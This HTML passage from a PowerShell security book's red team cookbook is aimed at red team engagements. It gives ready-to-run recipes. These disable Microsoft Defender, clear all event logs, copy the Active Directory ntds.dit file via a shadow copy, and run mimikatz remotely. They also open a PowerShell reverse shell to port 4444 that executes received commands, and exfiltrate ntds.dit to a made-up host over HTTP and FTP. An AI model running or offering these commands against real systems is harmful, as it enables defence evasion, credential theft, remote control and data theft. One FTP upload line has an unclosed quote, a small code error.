&gt; Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableNetworkProtection AuditMode -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -EnableControlledFolderAccess Disabled -Force</pre>
			<p>This command disables<a id="_idIndexMarker1587"/> real-time monitoring, intrusion prevention systems, <strong class="bold">Internet Outbound AntiVirus</strong> (<strong class="bold">IOAV</strong>) protection, and script scanning. It sets network protection to Audit Mode only (so that it’s not enforced any longer), disables <strong class="bold">Microsoft Active Protection Service </strong>(<strong class="bold">MAPS</strong>) reporting, sets the consent to never <a id="_idIndexMarker1588"/>send samples, and disables controlled folder access. The <strong class="source-inline">-Force</strong> parameter ensures that the changes are applied without <span class="No-Break">additional prompts.</span></p>
			<p>Please refer to the <strong class="source-inline">Set-MpPreference</strong> documentation if you want to tamper with features<a id="_idIndexMarker1589"/> other than the ones shown in this <span class="No-Break">example: </span><span class="No-Break">https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference</span><span class="No-Break">.</span></p>
			<h3>Clearing logs</h3>
			<p>You want to clear<a id="_idIndexMarker1590"/> all event logs, regardless of which PowerShell version<a id="_idIndexMarker1591"/> is deployed on the <span class="No-Break">target system.</span></p>
			<h4>Solution</h4>
			<p>You can clear all event logs by using the following <span class="No-Break">code snippet:</span></p>
			<pre class="source-code">
Get-WinEvent -ListLog * | foreach {
    try {       [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }
    catch {}
}</pre>
			<h2 id="_idParaDest-210"><a id="_idTextAnchor220"/>Credential access</h2>
			<p>The credential access phase<a id="_idIndexMarker1592"/> is all about stealing<a id="_idIndexMarker1593"/> credentials (for example, usernames and passwords). Those credentials can be used later to move laterally and authenticate against <span class="No-Break">other targets.</span></p>
			<h3>Exfiltrating the ntds.dit file</h3>
			<p>You want to exfiltrate the <strong class="source-inline">ntds.dit</strong> file, which contains<a id="_idIndexMarker1594"/> all identities and hashes<a id="_idIndexMarker1595"/> within <span class="No-Break">Active Directory.</span></p>
			<h4>Solution</h4>
			<p>As the <strong class="source-inline">ntds.dit</strong> file is constantly used by Active Directory and therefore locked, you need to find a way to access <strong class="source-inline">ntds.dit</strong>. One way is to create a shadow copy, create a symbolic link, and extract the file <span class="No-Break">from it:</span></p>
			<pre class="source-code">
$ShadowCopy = Invoke-CimMethod -ClassName "Win32_ShadowCopy" -Namespace "root\cimv2" -MethodName "Create" -Arguments @{Volume="C:\"}
$ShadowCopyPath = (Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $ShadowCopy.ShadowID }).DeviceObject + "\\"
cmd /c mklink /d C:\shadowcopy "$ShadowCopyPath"</pre>
			<p>You can now access the <strong class="source-inline">ntds.dit</strong> file without errors and either extract it or proceed with extracting identities. In this example, we will simply copy it to <strong class="source-inline">C:\tmp</strong> for <span class="No-Break">further use:</span></p>
			<pre class="source-code">
&gt; Copy-Item "C:\shadowcopy\Windows\NTDS\ntds.dit" -Destination "C:\tmp"</pre>
			<p>Once you’ve done this, you can delete<a id="_idIndexMarker1596"/> the symbolic link and proceed<a id="_idIndexMarker1597"/> with your <span class="No-Break">penetration test:</span></p>
			<pre class="source-code">
&gt; (Get-Item C:\shadowcopy).Delete()</pre>
			<h2 id="_idParaDest-211"><a id="_idTextAnchor221"/>Discovery</h2>
			<p>The discovery phase<a id="_idIndexMarker1598"/> is similar to the reconnaissance phase: its goal is to gather as much information as possible about potential targets. The discovery phase usually occurs after a red teamer has gained access to a system and plans their <span class="No-Break">next steps.</span></p>
			<h3>Finding out which user is currently logged on</h3>
			<p>You want to find out which user is currently logged on and want to display their username and domain (or computer name if it’s a <span class="No-Break">local account).</span></p>
			<h4>Solution</h4>
			<p>To achieve<a id="_idIndexMarker1599"/> your goal, you<a id="_idIndexMarker1600"/> can use the <span class="No-Break"><strong class="source-inline">whoami</strong></span><span class="No-Break"> command:</span></p>
			<pre class="source-code">
&gt; whoami</pre>
			<h3>Enumerating users (local and domain)</h3>
			<p>You want to find<a id="_idIndexMarker1601"/> out which user accounts exist<a id="_idIndexMarker1602"/> on the current system or in the <span class="No-Break">current domain.</span></p>
			<h4>Solution</h4>
			<p>Depending on your goal, there are multiple ways to <span class="No-Break">enumerate users.</span></p>
			<p>You can use WMI/CIM to enumerate all users, regardless of whether they are local or <span class="No-Break">domain users:</span></p>
			<pre class="source-code">
&gt; Get-CimInstance -ClassName Win32_UserAccount</pre>
			<p>To enumerate local users only, you can use <strong class="source-inline">Get-LocalUser</strong> or <span class="No-Break"><strong class="source-inline">net users</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Get-LocalUser
&gt; net users</pre>
			<p>There are multiple ways to enumerate domain users only. If the <strong class="source-inline">ActiveDirectory</strong> module is present, you can <span class="No-Break">use </span><span class="No-Break"><strong class="source-inline">Get-ADUser</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Get-ADUser</pre>
			<p>But in most cases, the <strong class="source-inline">ActiveDirectory</strong> module will not be present, so you can leverage <strong class="source-inline">adsisearcher</strong> to enumerate<a id="_idIndexMarker1603"/> all domain <span class="No-Break">users</span><span class="No-Break"><a id="_idIndexMarker1604"/></span><span class="No-Break"> instead:</span></p>
			<pre class="source-code">
$domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
$filter = "(sAMAccountType=805306368)"
$searcher = [adsisearcher]"(&amp;(objectCategory=User)$filter)"
$searcher.SearchRoot = "LDAP://$domain"
$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}</pre>
			<p>It is also possible to use <strong class="source-inline">net</strong> to enumerate all <span class="No-Break">domain users:</span></p>
			<pre class="source-code">
&gt; net user /domain</pre>
			<h3>Enumerating groups (local and domain)</h3>
			<p>You want to find out<a id="_idIndexMarker1605"/> which local or domain <span class="No-Break">groups</span><span class="No-Break"><a id="_idIndexMarker1606"/></span><span class="No-Break"> exist.</span></p>
			<h4>Solution</h4>
			<p>Depending on whether you want to enumerate local or domain groups, there are multiple ways to achieve <span class="No-Break">your goal.</span></p>
			<p>You can use WMI/CIM to enumerate all groups, regardless of whether they are local or <span class="No-Break">domain groups:</span></p>
			<pre class="source-code">
&gt; Get-CimInstance -ClassName Win32_Group</pre>
			<p>To enumerate local groups only, you can use <strong class="source-inline">Get-LocalGroup</strong> or <span class="No-Break"><strong class="source-inline">net localgroups</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Get-LocalGroup
&gt; net localgroups</pre>
			<p>There are multiple ways to enumerate domain users only. If the <strong class="source-inline">ActiveDirectory</strong> module is present, you can <span class="No-Break">use </span><span class="No-Break"><strong class="source-inline">Get-ADGroup</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Get-ADGroup</pre>
			<p>Since this is not the case most of the time, you can also leverage <strong class="source-inline">net</strong> to find out which domain <span class="No-Break">groups exist:</span></p>
			<pre class="source-code">
&gt; net group /domain</pre>
			<p>You can also use <strong class="source-inline">adsisearcher</strong> to enumerate all domain groups, as shown in the following <span class="No-Break">code snippet:</span></p>
			<pre class="source-code">
$domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
$searcher = [adsisearcher]"(&amp;(objectCategory=group))"
$searcher.SearchRoot = "LDAP://$domain"
$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}</pre>
			<h3>Retrieving information about the current system</h3>
			<p>You want to retrieve information<a id="_idIndexMarker1607"/> about the<a id="_idIndexMarker1608"/> <span class="No-Break">current system.</span></p>
			<h4>Solution</h4>
			<p>Using the <strong class="source-inline">hostname</strong> command, you can find out the hostname of the <span class="No-Break">current machine:</span></p>
			<pre class="source-code">
&gt; hostname</pre>
			<p>By using the <strong class="source-inline">systeminfo</strong> command, you can retrieve detailed system configuration information about the <span class="No-Break">current machine:</span></p>
			<pre class="source-code">
&gt; systeminfo</pre>
			<p><strong class="source-inline">Systeminfo</strong> lets you collect various pieces of information about the current system, such as hardware properties, the current operating system version, hostname, BIOS version, boot time, and much more <span class="No-Break">valuable information.</span></p>
			<h3>Enumerating network-related information</h3>
			<p>You want to learn more<a id="_idIndexMarker1609"/> about the network-related information<a id="_idIndexMarker1610"/> of the current system. What is its IP address and which other devices are connected to the <span class="No-Break">current machine?</span></p>
			<h4>Solution</h4>
			<p>You can use the following commands to enumerate <span class="No-Break">network-related information:</span></p>
			<pre class="source-code">
&gt; ipconfig /all</pre>
			<p><strong class="source-inline">ipconfig /all</strong> displays detailed information about all network interfaces (including IP addresses, subnet masks, default gateways, DNS servers, and more) configured on <span class="No-Break">the system:</span></p>
			<pre class="source-code">
&gt; Get-NetAdapter | fl</pre>
			<p>Using <strong class="source-inline">Get-NetAdapter</strong>, you can retrieve information about network adapters and their properties, such as their interface index, name, MAC address, <span class="No-Break">and more:</span></p>
			<pre class="source-code">
&gt; route print</pre>
			<p><strong class="source-inline">route print</strong> displays the routing table on the system and shows the network destinations, associated gateway addresses, and <span class="No-Break">interface information:</span></p>
			<pre class="source-code">
&gt; arp -A</pre>
			<p><strong class="source-inline">arp -a</strong> displays the <strong class="bold">Address Resolution Protocol</strong> (<strong class="bold">ARP</strong>) cache, which contains mappings of IP addresses to MAC addresses<a id="_idIndexMarker1611"/> for devices on the local network. By doing this, you can easily find out potential<a id="_idIndexMarker1612"/> targets<a id="_idIndexMarker1613"/> for <span class="No-Break">lateral movement.</span></p>
			<h3>Enumerating domain information</h3>
			<p>You want to enumerate the current domain<a id="_idIndexMarker1614"/> and want to find out<a id="_idIndexMarker1615"/> more about the forest and the domain and <span class="No-Break">forest trusts.</span></p>
			<h4>Solution</h4>
			<p>You can leverage the <strong class="source-inline">System.DirectoryServices.ActiveDirectory</strong> namespace to enumerate the current domain <span class="No-Break">and forest:</span></p>
			<pre class="source-code">
&gt; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</pre>
			<p>The <strong class="source-inline">GetCurrentDomain()</strong> command retrieves the current domain object in Active Directory and returns information such as the domain name, domain controllers, and <span class="No-Break">other properties:</span></p>
			<pre class="source-code">
&gt; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</pre>
			<p>The <strong class="source-inline">GetCurrentDomain()).GetAllTrustRelationships()</strong> command retrieves all trust relationships established by the current domain in Active Directory, providing information about trusted domains and <span class="No-Break">their properties:</span></p>
			<pre class="source-code">
&gt; [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</pre>
			<p>The <strong class="source-inline">GetCurrentForest()</strong> command retrieves the current forest object in Active Directory and returns information such as the forest name, domain trees, and <span class="No-Break">other properties:</span></p>
			<pre class="source-code">
&gt; ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()</pre>
			<p>The preceding command <a id="_idIndexMarker1616"/>retrieves all trust relationships<a id="_idIndexMarker1617"/> for a specific forest in Active Directory and provides information about trusted domains within that forest, as well as <span class="No-Break">their properties.</span></p>
			<h3>Enumerating domain controllers (DCs)</h3>
			<p>You want to enumerate<a id="_idIndexMarker1618"/> the DCs of a domain and find<a id="_idIndexMarker1619"/> out which DC was used for the current <span class="No-Break">authenticated session.</span></p>
			<h4>Solution</h4>
			<p>You can use <strong class="source-inline">nltest</strong> to query and list all DCs available in the <span class="No-Break">specified domain:</span></p>
			<pre class="source-code">
&gt; nltest /dclist:PSSEC.local</pre>
			<p>To retrieve and display a list of all DCs in the current domain, use the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
&gt; net group "domain controllers" /domain</pre>
			<p>To determine which DC was used to authenticate the current session, run the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
&gt; nltest /dsgetdc:PSSEC.local</pre>
			<h3>Listing installed antivirus (AV) products</h3>
			<p>You want to list all AV products<a id="_idIndexMarker1620"/> that were installed<a id="_idIndexMarker1621"/> on the <span class="No-Break">current system.</span></p>
			<h4>Solution</h4>
			<p>You can enumerate all installed AV products by <span class="No-Break">using WMI/CIM:</span></p>
			<pre class="source-code">
&gt; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct</pre>
			<h2 id="_idParaDest-212"><a id="_idTextAnchor222"/>Lateral movement</h2>
			<p>Once an initial foothold has been <a id="_idIndexMarker1622"/>achieved, a red teamer<a id="_idIndexMarker1623"/> usually tries to move laterally from one host to another, exploring and exploiting additional targets within the network. Lateral movement allows the attacker to explore the network, escalate privileges, access valuable resources, and ultimately gain control over critical systems <span class="No-Break">or data.</span></p>
			<h3>Executing a single command or binary on a remote machine</h3>
			<p>You want to execute<a id="_idIndexMarker1624"/> a single command<a id="_idIndexMarker1625"/> or binary on a <span class="No-Break">remote machine.</span></p>
			<h4>Solution</h4>
			<p>To execute a single command or binary on a remote (or local) machine, you can <span class="No-Break">leverage </span><span class="No-Break"><strong class="source-inline">Invoke-Command</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Invoke-Command <strong class="bold">&lt;ip address or hostname&gt;</strong> {<strong class="bold">&lt;scriptblock/binary&gt;</strong>}</pre>
			<p>The following example shows how you can execute the <strong class="source-inline">Get-Process</strong> cmdlet, as well as the <strong class="source-inline">mimikatz.exe</strong> binary, on the remote <span class="No-Break">host, </span><span class="No-Break"><strong class="source-inline">PSSec-PC01</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Invoke-Command PSSec-PC01 {Get-Process}
&gt; Invoke-Command PSSec-PC01 {C:\tmp\mimikatz.exe}</pre>
			<p>If you want to use <strong class="source-inline">Invoke-Command</strong> against an IP address, ensure that the remote host’s IP is present in <strong class="bold">TrustedHosts</strong> and is configured for <span class="No-Break">remote access.</span></p>
			<h3>Initiating a remote interactive PowerShell session</h3>
			<p>You want to initiate<a id="_idIndexMarker1626"/> a remote PowerShell session<a id="_idIndexMarker1627"/> in which you can interactively run <span class="No-Break">PowerShell commands.</span></p>
			<h4>Solution</h4>
			<p>You can use <strong class="source-inline">Enter-PSSession</strong> to initiate an interactive remote <span class="No-Break">PowerShell session:</span></p>
			<pre class="source-code">
Enter-PSSession <strong class="bold">&lt;ip address or hostname&gt;</strong></pre>
			<p>In this case, we would establish a PowerShell session to the remote <span class="No-Break">host, </span><span class="No-Break"><strong class="source-inline">PSSec-PC01</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; Enter-PSSession PSSec-PC01</pre>
			<h2 id="_idParaDest-213"><a id="_idTextAnchor223"/>Command and Control (C2)</h2>
			<p>In this phase, the red teamer<a id="_idIndexMarker1628"/> is trying to communicate<a id="_idIndexMarker1629"/> with its victim hosts to <span class="No-Break">control them.</span></p>
			<h3>Opening a reverse shell</h3>
			<p>You want to open a reverse shell on a <span class="No-Break">remote system.</span></p>
			<p>A reverse shell is a shell that a red teamer<a id="_idIndexMarker1630"/> can use to establish a connection to a remote system without<a id="_idIndexMarker1631"/> the need to initiate a remote session. In the case of a reverse shell, usually, a payload is somehow stored on the victim system. Once the payload is executed, the victim establishes the connection back to the server that was specified by the red teamer, on which usually a listener is listening for <span class="No-Break">incoming connections.</span></p>
			<h4>Solution</h4>
			<p>To reproduce this using PowerShell, first, create and start a listener on your <span class="No-Break">C2 server:</span></p>
			<pre class="source-code">
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 4444)
$listener.Start()
$client = $listener.AcceptTcpClient()</pre>
			<p>Once the listener<a id="_idIndexMarker1632"/> has been started, it waits for a connection, which<a id="_idIndexMarker1633"/> it accepts immediately, and stores the session in the <strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">client</strong></span><span class="No-Break"> variable.</span></p>
			<p>Have the <strong class="bold">victim machine</strong> execute your payload. This<a id="_idIndexMarker1634"/> could look something <span class="No-Break">like this:</span></p>
			<pre class="source-code">
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect("172.29.0.20", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
while($true) {
    $data = ""
    while($stream.DataAvailable) {
        $bytes = New-Object Byte[] 1024
        $count = $stream.Read($bytes, 0, 1024)
        $data += [System.Text.Encoding]::ASCII.GetString($bytes, 0, $count)
    }
    if ($data) {
        Invoke-Expression $data
        $data = ""
    }
}
$writer.Close()
$reader.Close()
$client.Close()</pre>
			<p>This code creates a new TCP socket, connects<a id="_idIndexMarker1635"/> to the server on the <strong class="source-inline">172.29.0.20</strong> IP address on port <strong class="source-inline">4444</strong>, and waits for input<a id="_idIndexMarker1636"/> once connected. The client can now either read incoming commands or write to the <span class="No-Break">command line.</span></p>
			<p>Again, on the C2 server, you can now send commands over <span class="No-Break">the stream:</span></p>
			<pre class="source-code">
$stream = $client.GetStream()
$bytes = [System.Text.Encoding]::ASCII.GetBytes("Write-Host 'Hello world!'")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Flush()</pre>
			<p>Once the connection needs to be terminated, just send the following command from the <span class="No-Break">C2 server:</span></p>
			<pre class="source-code">
$client.Close()</pre>
			<p>You can find this code in this chapter’s <span class="No-Break">GitHub repository:</span></p>
			<ul>
				<li><span class="No-Break">Client: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/RevShell_Client.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/RevShell_Client.ps1</span></a></li>
				<li><span class="No-Break">Server: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/RevShell_Server.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/RevShell_Server.ps1</span></a></li>
			</ul>
			<p>Of course, there are also tools such as PowerShell Empire and Metasploit that already have modules to generate payloads automatically<a id="_idIndexMarker1637"/> and open a <span class="No-Break">reverse</span><span class="No-Break"><a id="_idIndexMarker1638"/></span><span class="No-Break"> shell.</span></p>
			<h2 id="_idParaDest-214"><a id="_idTextAnchor224"/>Exfiltration</h2>
			<p>In the exfiltration phase, the red teamer<a id="_idIndexMarker1639"/> tries to steal and exfiltrate<a id="_idIndexMarker1640"/> data from the <span class="No-Break">victim’s network.</span></p>
			<h3>Exfiltrating a file and uploading it to a web server</h3>
			<p>You want<a id="_idIndexMarker1641"/> to exfiltrate<a id="_idIndexMarker1642"/> the content of a file<a id="_idIndexMarker1643"/> and upload<a id="_idIndexMarker1644"/> it to a <span class="No-Break">web server.</span></p>
			<h4>Solution</h4>
			<p>You can achieve your goal by reading the bytes of the desired file, converting them into a <strong class="bold">Base64</strong> string, and uploading them to a web server <span class="No-Break">using </span><span class="No-Break"><strong class="source-inline">Invoke-WebRequest</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; $FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\shadowcopy\Windows\NTDS\ntds.dit"))
&gt; Invoke-WebRequest -uri http://PSSec-example.com/upload -Method POST -Body $FileContent</pre>
			<p>In this example, we are uploading the Base64-encoded <strong class="source-inline">ntds.dit</strong> file that we extracted earlier as a shadow copy to <strong class="source-inline">http://PSSec-example.com/upload</strong> (which does not exist; we just made up for <span class="No-Break">this example).</span></p>
			<p>It is also possible to use the <strong class="source-inline">System.NET.WebClient</strong> class to extract and upload a file. The following code snippet demonstrates how this could <span class="No-Break">be achieved:</span></p>
			<pre class="source-code">
&gt; $FileToUpload = "C:\shadowcopy\Windows\NTDS\ntds.dit"
&gt; (New-Object System.NET.WebClient).UploadFile("ftp://PSSec-example.com/ntds.dit, $FileToUpload)</pre>
			<h2 id="_idParaDest-215"><a id="_idTextAnchor225"/>Impact</h2>
			<p>Recipes in the impact phase<a id="_idIndexMarker1645"/> are determined to cause mayhem; the red teamer is trying to interrupt, destroy, or manipulate systems <span class="No-Break">or data.</span></p>
			<h3>Stopping a service</h3>
			<p>You want<a id="_idIndexMarker1646"/> to stop<a id="_idIndexMarker1647"/> <span class="No-Break">a service.</span></p>
			<h4>Solution</h4>
			<p>To do this, you can use the <span class="No-Break"><strong class="source-inline">Stop-Service</strong></span><span class="No-Break"> cmdlet:</span></p>
			<pre class="source-code">
&gt; Stop-Service -Name Spooler -Force</pre>
			<p>If executed, the preceding command would stop the <strong class="source-inline">Spooler</strong> service. By using the <strong class="source-inline">-Force</strong> parameter, the service will be stopped abruptly without prompting <span class="No-Break">for confirmation.</span></p>
			<h3>Shutting down a system</h3>
			<p>You want<a id="_idIndexMarker1648"/> to shut down<a id="_idIndexMarker1649"/> <span class="No-Break">a system.</span></p>
			<h4>Solution</h4>
			<p>You can achieve your goal using several methods. One of them is by using the <span class="No-Break"><strong class="source-inline">Stop-Computer</strong></span><span class="No-Break"> cmdlet:</span></p>
			<pre class="source-code">
&gt; Stop-Computer -ComputerName localhost</pre>
			<p>Using the <strong class="source-inline">-ComputerName</strong> parameter, you can specify whether the local or a remote host should be <span class="No-Break">shut down.</span></p>
			<p>You can also use the <span class="No-Break"><strong class="source-inline">shutdown</strong></span><span class="No-Break"> command:</span></p>
			<pre class="source-code">
&gt; shutdown /s /t 0</pre>
			<p>The <strong class="source-inline">/s</strong> parameter indicates<a id="_idIndexMarker1650"/> that the system will be shut down. The <strong class="source-inline">/t</strong> parameter indicates<a id="_idIndexMarker1651"/> how many seconds will pass until the command is executed. In this case, the system is shut <span class="No-Break">down immediately.</span></p>
			<h1 id="_idParaDest-216"><a id="_idTextAnchor226"/>Summary</h1>
			<p>In this chapter, you learned about the different phases of an attack. You were provided with an overview of common PowerShell red team tools and were presented with a red team cookbook, which can help you during your next red <span class="No-Break">team engagements.</span></p>
			<p>This red team cookbook contained many helpful code snippets that helped you learn about a bunch of important options when using <strong class="source-inline">powershell.exe</strong>, how to create obfuscation using Base64, how to download files, and how to execute scripts in memory only. You were reminded of how to execute commands on remote machines, as well as how to open <span class="No-Break">a session.</span></p>
			<p>We looked at several options regarding how persistence can be established using PowerShell and how a downgrade attack can be performed. You also got a refresher on how in-memory injection works and how to open a reverse shell without any of the common red teaming tools. Last but not least, you learned how to <span class="No-Break">clear logs.</span></p>
			<p>Now that we’ve explored various red teamer tasks and recipes, in the next chapter, we’ll explore blue team and infosec practitioner tasks <span class="No-Break">and recipes.</span></p>
			<h1 id="_idParaDest-217"><a id="_idTextAnchor227"/>Further reading</h1>
			<p>If you want to explore some of the topics that were mentioned in this chapter, take a look at <span class="No-Break">these resources:</span></p>
			<p><strong class="bold">Abusing WMI to build a persistent asynchronous and </strong><span class="No-Break"><strong class="bold">fileless backdoor</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li><span class="No-Break">https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</span></li>
				<li><span class="No-Break">https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf</span></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">New-GPLink</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li><span class="No-Break">https://learn.microsoft.com/en-us/powershell/module/grouppolicy/</span><span class="No-Break">new-gplink</span></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">PowerUpSQL</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li><span class="No-Break">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</span></li>
				<li><span class="No-Break">https://github.com/NetSPI/PowerUpSQL/wiki</span></li>
			</ul>
			<p>You can find all the links mentioned in this chapter in the GitHub repository for <a href="B16679_08_Final_PD.xhtml#_idTextAnchor204"><span class="No-Break"><em class="italic">Chapter 8</em></span></a> – there’s no need to manually type in every <span class="No-Break">link: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/Links.md"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter08/Links.md</span></a><span class="No-Break">.</span></p>
		</div>
	</body></html>